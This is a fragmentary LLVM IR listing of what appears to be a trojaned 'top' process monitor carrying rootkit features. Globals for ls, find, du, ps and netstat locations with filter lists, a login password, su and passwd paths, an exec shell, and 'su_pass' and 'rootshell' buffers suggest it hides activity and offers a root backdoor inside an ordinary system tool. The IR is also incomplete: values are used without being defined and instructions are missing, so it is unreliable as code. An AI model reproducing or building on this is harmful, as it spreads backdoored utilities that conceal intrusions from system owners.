@copyright = global i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str, i32 0, i32 0), align 8
@conf_file = global i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.1, i32 0, i32 0), align 8
@file_section = global i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), align 8
@ls_location = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i32 0, i32 0), align 8
@find_location = global i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i32 0, i32 0), align 8
@du_location = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), align 8
@file_filters = global i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.6, i32 0, i32 0), align 8
@ps_section = global i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i32 0, i32 0), align 8
@ps_location = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i32 0, i32 0), align 8
@ps_filters = global i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.9, i32 0, i32 0), align 8
@netstat_section = global i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.10, i32 0, i32 0), align 8
@netstat_location = global i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0), align 8
@netstat_filters = global i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.12, i32 0, i32 0), align 8
@login_section = global i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i32 0, i32 0), align 8
@login_pass = global i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.14, i32 0, i32 0), align 8
@su_location = global i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.15, i32 0, i32 0), align 8
@ping_location = global i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.16, i32 0, i32 0), align 8
@passwd_location = global i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.17, i32 0, i32 0), align 8
@exec_shell = global i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.18, i32 0, i32 0), align 8
@myname = global i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.19, i32 0, i32 0), align 8
@d_loadave = global i32 (...)* @i_loadave, align 8
@d_procstates = global i32 (...)* @i_procstates, align 8
@d_cpustates = global i32 (...)* @i_cpustates, align 8
@d_memory = global i32 (...)* @i_memory, align 8
@d_message = global i32 (...)* @i_message, align 8
@d_header = global i32 (...)* @i_header, align 8
@d_process = global i32 (...)* @i_process, align 8
@main.tempbuf1 = internal global [50 x i8] zeroinitializer, align 16
@main.tempbuf2 = internal global [50 x i8] zeroinitializer, align 16
@main.command_chars = internal global [16 x i8] c"\0C qh?en#sdkriIu\00", align 16
@stdout = external global %struct._IO_FILE*, align 8
@stdoutbuf = common global [2048 x i8] zeroinitializer, align 16
@optind = external global i32, align 4
@stderr = external global %struct._IO_FILE*, align 8
@optarg = external global i8*, align 8
@max_topn = internal global i32 0, align 4
@smart_terminal = external global i8, align 1
@jmp_int = common global [1 x %struct.__jmp_buf_tag] zeroinitializer, align 16
@f_ptr = common global [256 x i8*] zeroinitializer, align 16
@overstrike = external global i32, align 4
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i8**, align 8
  %i = alloca i32, align 4
  %active_procs = alloca i32, align 4
  %change = alloca i32, align 4
  %system_info = alloca %struct.system_info, align 8
  %statics = alloca %struct.statics, align 8
  %processes = alloca i8*, align 8
  %old_sigmask = alloca i32, align 4
  %topn = alloca i32, align 4
  %delay = alloca i32, align 4
  %displays = alloca i32, align 4
  %curr_time = alloca i64, align 8
  %get_userid = alloca i8* (...)*, align 8
  %uname_field = alloca i8*, align 8
  %header_text = alloca i8*, align 8
  %env_top = alloca i8*, align 8
  %preset_argv = alloca i8**, align 8
  %preset_argc = alloca i32, align 4
  %av = alloca i8**, align 8
  %ac = alloca i32, align 4
  %dostates = alloca i8, align 1
  %do_unames = alloca i8, align 1
  %interactive = alloca i8, align 1
  %warnings = alloca i8, align 1
  %ch = alloca i8, align 1
  %iptr = alloca i8*, align 8
  %no_command = alloca i8, align 1
  %timeout = alloca %struct.timeval, align 8
  %ps = alloca %struct.process_select, align 8
  %readfds = alloca %struct.__sigset_t, align 8
  %su_pass_ptr = alloca i8*, align 8
  %rootshell_ptr = alloca i8*, align 8
  %su_pass = alloca [256 x i8], align 16
  %rootshell = alloca [256 x i8], align 16
  %buf = alloca [2048 x i8], align 16
  %proc_filter = alloca [256 x i8], align 16
  %proc_filter_ptr = alloca i8*, align 8
  %no_proc_filters = alloca i32, align 4
  %j = alloca i32, align 4
  %counter = alloca i32, align 4
  %print = alloca i32, align 4
  %__d0 = alloca i32, align 4
  %__d1 = alloca i32, align 4
  %newval = alloca i32, align 4
  %errmsg = alloca i8*, align 8
  store i32 0, i32* %1, align 4
  store i32 %argc, i32* %2, align 4
  store i8** %argv, i8*** %3, align 8
  store i32 15, i32* %topn, align 4
  store i32 5, i32* %delay, align 4
  store i32 0, i32* %displays, align 4
  store i8* (...)* @username, i8* (...)** %get_userid, align 8
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i32 0, i32 0), i8** %uname_field, align 8
  store i32 0, i32* %preset_argc, align 4
  store i8 0, i8* %dostates, align 1
  store i8 1, i8* %do_unames, align 1
  store i8 2, i8* %interactive, align 1
  store i8 0, i8* %warnings, align 1
  store i8 1, i8* %no_command, align 1
  %4 = load %struct._IO_FILE*, %struct._IO_FILE** @stdout, align 8
  %5 = call i32 @setvbuf(%struct._IO_FILE* %4, i8* getelementptr inbounds ([2048 x i8], [2048 x i8]* @stdoutbuf, i32 0, i32 0), i32 0, i64 2048) #6
  %12 = load i8**, i8*** %3, align 8
  %13 = getelementptr inbounds i8*, i8** %12, i64 0
  %14 = load i8*, i8** %13, align 8
  %15 = call i8* @strrchr(i8* %14, i32 47) #8
  store i8* %16, i8** @myname, align 8
  %18 = icmp eq i8* %16, null
  %21 = load i8**, i8*** %3, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  store i8* %23, i8** @myname, align 8
  store i8* %72, i8** %rootshell_ptr, align 8
  %74 = getelementptr inbounds [256 x i8], [256 x i8]* %rootshell, i32 0, i32 0
  %75 = load i8*, i8** %rootshell_ptr, align 8
  %76 = call i8* @strcpy(i8* %74, i8* %75) #7
